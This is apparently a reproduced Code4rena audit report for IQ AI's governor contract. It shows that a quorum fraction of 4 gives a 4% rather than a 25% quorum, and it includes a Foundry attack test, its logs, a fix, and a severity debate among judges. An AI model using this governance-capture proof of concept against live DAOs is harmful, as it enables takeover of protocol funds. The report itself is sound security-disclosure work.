---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - sector/dex
  - sector/lending
  - sector/staking
  - sector/governance
  - platform/code4rena
protocol: "[[IQ AI]]"
auditors:
  - DoD4uFN
report: "https://code4rena.com/reports/2025-01-iq-ai"
genome:
  - "[[quorum-supply-drift]]"
  - "[[governance-voting-power-snapshot]]"
  - "[[governance/proposal-manipulation]]"
  - "[[privilege-escalation/role-bypass]]"
  - "[[known-pattern]]"
  - "[[governance-vote]]"
  - "[[add-snapshot]]"
  - "[[precondition/large-capital]]"
  - "[[misassumption/math-is-safe]]"
  - "[[blast-radius/protocol-wide]]"
---
# [H-01] Adversary can win proposals with voting power as low as 4%

- id: 50064
- impact: HIGH
- protocol: IQ AI
- reporter: DoD4uFN (Code4rena)
- source: https://code4rena.com/reports/2025-01-iq-ai

## Summary


This bug report discusses a vulnerability in the TokenGovernor.sol contract, which is part of the code for a project called IQ AI. The contract is designed to require a minimum quorum of 25% of the voting power for any proposals to be executed. However, the bug allows an attacker to execute a proposal with only 4% of the voting power. This is a significant risk, as it allows malicious proposals to be executed against the expectations of the project. The bug can be seen in the code, where the value for the quorum is set to 4 instead of 25. This is a documentation error, as the code suggests that the value should be 25. A proof of concept has been provided to demonstrate how an attacker with only 4% of the voting power can successfully execute a proposal. The recommended mitigation step is to correct the quorum value to 25. There has been some discussion among the reviewers about the severity of the bug, with some arguing that it should be downgraded to QA or even considered invalid. However, the judge has decided to maintain the bug as High severity due to the potential risk of price increases for tokens and the impact on the ownership and management of the Agent contract. 

## Details



<https://github.com/code-423n4/2025-01-iq-ai/blob/main/src/TokenGovernor.sol# L55>

The expected quorum for proposals is 25% of the voting power.

An attacker can execute any proposal with as low as 4% of the voting power.

Proposals that don’t get enough quorum are expected to fail because of that threshold, but the bug bypasses that protection by a 6.25x lower margin. Deeming High severity as a form of executing malicious proposals against expectations.

### Proof of Concept

The error is in the `4` in the line `GovernorVotesQuorumFraction(4)`. It doesn’t represent 1/4th of supply but 4/100 actually.
```

    constructor(
        string memory _name,
        IVotes _token,
        Agent _agent
    )
        Governor(_name)
        GovernorVotes(_token)
@>      GovernorVotesQuorumFraction(4) // quorum is 25% (1/4th) of supply
    {
        agent = _agent;
    }
```

Ref: <https://github.com/code-423n4/2025-01-iq-ai/blob/main/src/TokenGovernor.sol# L55>

This can be seen in the `GovernorVotesQuorumFraction` OpenZeppelin contract that is inherited.

Note how the `quorumDenominator()` is `100` by default and how the `quorum()` is calculated as `supply * numerator / denominator`.

In other words, 4% for the protocol governor (instead of 25%).
```

/**
 * @dev Returns the quorum denominator. Defaults to 100, but may be overridden.
 */
function quorumDenominator() public view virtual returns (uint256) {
    return 100;
}

/**
 * @dev Returns the quorum for a timepoint, in terms of number of votes: `supply * numerator / denominator`.
 */
function quorum(uint256 timepoint) public view virtual override returns (uint256) {
    return (token().getPastTotalSupply(timepoint) * quorumNumerator(timepoint)) / quorumDenominator();
}
```

Ref: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.2.0/contracts/governance/extensions/GovernorVotesQuorumFraction.sol# L62-L74>

**Coded Proof of Concept**

Here is a coded POC to show that those values are not overriden, and the flawed logic holds as described in the previous section.

1. Add the test to `test/TokenGovernorTest.sol`
2. `forge test -vv --mt test_AttackLowQuorumThreshold`
```

function test_AttackLowQuorumThreshold() public {
    // Setup agent
    factory.setAgentStage(address(agent), 1);

    // Setup an attacker with 4% of voting power
    // Transfer from the whale that has 37% of tokens
    vm.startPrank(whale);
    address attacker = makeAddr("attacker");
    uint256 fourPercentSupply = token.totalSupply() * 4 / 100;
    token.transfer(attacker, fourPercentSupply);

    // Delegate attacker tokens to themselves
    vm.startPrank(attacker);
    token.delegate(attacker);

    // Make a malicious proposal with 4% of votes (0.01% needed)
    vm.warp(block.timestamp + 1);
    address[] memory targets = new address[](1);
    targets[0] = address(666);
    uint256[] memory values = new uint256[](1);
    bytes[] memory calldatas = new bytes[](1);
    string memory description = "";
    uint256 nonce = governor.propose(targets, values, calldatas, description);

    // Cast vote with 4% voting power
    vm.warp(block.timestamp + governor.votingDelay() + 1);
    governor.castVote(nonce, 1);

    // Warp to the end of the voting period
    // It can be assessed that with a total votes of 100 Million, the quorum is only 4 Million
    // The voting power of the attacker can be as low as 4 Million (4%)
    vm.warp(block.timestamp + governor.votingPeriod());
    console.log();
    console.log("totalVotes:       ", token.getPastTotalSupply(block.timestamp - 1));
    console.log("quorum:           ", governor.quorum(block.timestamp - 1));
    console.log("votingPower:      ", governor.getVotes(attacker, block.timestamp - 1));

    // The proposal succeeds with only 4% of voting power (lower than the expected 25% quorum)
    governor.execute(targets, values, calldatas, keccak256(abi.encodePacked(description)));
    console.log("ATTACK SUCCEEDED WITH ONLY 4% OF VOTES");
    vm.stopPrank();
}
```

The test shows how an adversary with only 4% of the voting power can successfully execute a malicious proposal.
```

Logs:
  totalVotes:        100000000000000000000000000
  quorum:            4000000000000000000000000
  votingPower:       4000000000000000000000000
  ATTACK SUCCEEDED WITH ONLY 4% OF VOTES
```

### Recommended mitigation steps

Set the 25% quorum correctly:
```

    constructor(
        string memory _name,
        IVotes _token,
        Agent _agent
    )
        Governor(_name)
        GovernorVotes(_token)
-       GovernorVotesQuorumFraction(4) // quorum is 25% (1/4th) of supply
+       GovernorVotesQuorumFraction(25) // quorum is 25% (1/4th) of supply
    {
        agent = _agent;
    }
```

**[tom2o17 (IQ AI) disputed and commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=z4Rst5H3fWy):**

> So I think there are two outcomes:
>
> 1. The comment is stale in which case this is informational
> 2. The comment takes precedent over the code, not sure why this would be the case, and I would agree w/ the initial evaluation.
>
> wrt “there are no documentation indicating this is a documentation error”, I would argue the code itself suggests its a documentation error.
>
> I would also be curious as to where is there documentation indicating this is a code error, outside of the stale comment.
>
> Personally would lean towards downgrading, but that is because I view all documentation as subservient to the contract functionality not the other way around. Otherwise all documentation errors would be highs.

**[0xnev (judge) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=3pTi49aZSY3):**

> On secondary reviews and discussions, I believe this issue to be of a genuine documentation error and is of informational severity because 4% is likely appropriate based on various blue-chip defi protocol examples:
>
> 1. [Uniswap - 4%](https://docs.uniswap.org/concepts/governance/glossary), see [`quorumVotes`](https://etherscan.io/address/0x408ED6354d4973f66138C91495F2f2FCbd8724C3# readProxyContract)
> 2. [Compound-4%, see `quorumVotes`](https://etherscan.io/address/0xc0Da02939E1441F497fd74F78cE7Decb17B66529# readProxyContract)
>
> As such, I am downgrading to QA, defaulting to invalid per judging risk assessments.

**[KupiaSec (warden) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=bRy9ZVy7ERh):**

> I agree with 0xnev’s earlier comments that insist 4% is too low.
>
> Additionally, if there is no exact documentation regarding this quorum, the comment should be considered the source of truth. I have seen many instances where issues that show inconsistency between code implementation and comments are considered high/medium severity.
>
> I believe this can be considered H/M.

**[0xnev (judge) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=bRy9ZVy7ERh&commentChild=Q48fMPqcfDk):**

> Could you please provide concrete evidence that 4% quorums are not sufficient? I have provided explicit blue-chip DeFi examples above, if you have an example of a governance attack because of such a quorum being low, I will reconsider the issue.
>
> If not, I am inclined to maintain as informational, because afaik, C4 has never graded an issue more than QA for differing specs unless the outcome is significant.

**[McToady (warden) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=bRy9ZVy7ERh&commentChild=JBsJRGwihKg):**

> I think comparing suitable governance quorum percentages for Agent tokens launched through this protocol to blue chip defi tokens is not ideal comparison as we have to consider the following:
>
> **Differences in overall market cap of the tokens**
> Acquiring 4% of Uni/Compound tokens would require a significant amount of capital.
> Tokens here will be launched on Fraxtal, a chain with [significantly less TVL](https://defillama.com/chain/Fraxtal) so it’s safe to assume the market cap of agents will likely be many multiples smaller than any defi blue chip token.
>
> **Likely initial token distributions**
> An early buyer during bootstrap phase could quite easily own 4% of the total supply and potentially purchase across multiple wallets to to conceal this from other investors.
>
> I think a more apt comparison would be to look at the token distributions of similar AI agent tokens (such as those launched on the [Virtuals platform](https://app.virtuals.io/prototypes?sortBy=virtualTokenValue&sortOrder=desc&page=1), where you will find typically multiple holders who each own at least 4% of the total supply.
>
> While the 4 vs 25% may have been a documentation error (and 25% may actually be too high), 4% does indeed seem too low.

**[0xnev (judge) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=bRy9ZVy7ERh&commentChild=DNrv2N9wR9s):**

> Thank you, I believe this is a fair argument. Based on likely volatility of AI token prices, I believe it is a significant risk to fix the quorum at 4%, especially for low price tokens, and considering all tokens are fixed to 100 million supply as well.
>
> Based on clarifications in [S-188](https://code4rena.com/audits/2025-01-iq-ai/submissions/S-188), I believe the main risk now would be the ownership and mismanagement (The TokenGovernor voting values impact this only) over the Agent contract itself holding the LP tokens. If price of tokens increase significantly this could have a significant impact.
>
> Still considering between H/M, and happy to take any further comments supporting both severities.

**[0xnev (judge) commented](https://code4rena.com/audits/2025-01-iq-ai/submissions/F-3?commentParent=bRy9ZVy7ERh&commentChild=s8NTow4bwS7):**

> Will maintain as High severity, considering the risk of price significantly increasing for tokens and the potential ownership and mismanagement (The TokenGovernor voting values impact this only) over the Agent contract itself holding the LP tokens.

---


